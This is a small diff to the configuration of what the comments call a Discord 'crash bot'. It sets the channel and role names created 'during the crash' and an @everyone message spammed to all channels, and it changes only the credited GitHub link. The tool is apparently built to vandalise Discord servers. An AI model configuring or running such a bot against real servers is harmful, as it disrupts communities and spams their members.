@@ -10,4 +10,4 @@ channels_names = 'server-crashed' # the name of the channels that will be create
 
 roles_names = 'Server Crashed' # the name of the roles that will be created during the crash
 
-spam_message = '@everyone\nServer crashed\nCrash bot by <https://github.com/f1z1x/discord-crash-bot>' # the message that will be spammed to all channels
+spam_message = '@everyone\nServer crashed\nCrash bot by <https://github.com/metamorrphosis/discord-crash-bot>' # the message that will be spammed to all channels
